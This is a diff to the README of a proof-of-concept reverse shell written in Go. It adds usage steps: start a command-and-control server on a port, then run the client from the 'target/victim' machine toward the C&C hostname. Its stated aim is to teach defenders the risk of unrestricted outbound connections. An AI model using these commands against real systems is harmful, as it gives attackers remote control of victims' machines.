@@ -3,6 +3,18 @@ This is a PoC reverse shell written in Go.
 
 Purely for educational purposes. Use responsibly.
 
+# Usage
+Start command and control server (e.g. replace -linux with -darwin if your server is a macOS one) and select a port of your choosing (port 7788 is used below)
+```bash
+server-linux 7788
+```
+
+Now connect from the target/victim system, specifying the hostname (_command-and-control-server_) of the C&C server, and port that the server is listening on (7788 in our example)
+```bash
+client-linux command-and-control-server-hostname 7788
+```
+
+
 # Why?
 Many network system defenders may not realise the risk associated with arbitrary outbound connection from protected systems. They may still be under the illusion that locking down and blocking inbound connections may be sufficient to protect critical systems.
 
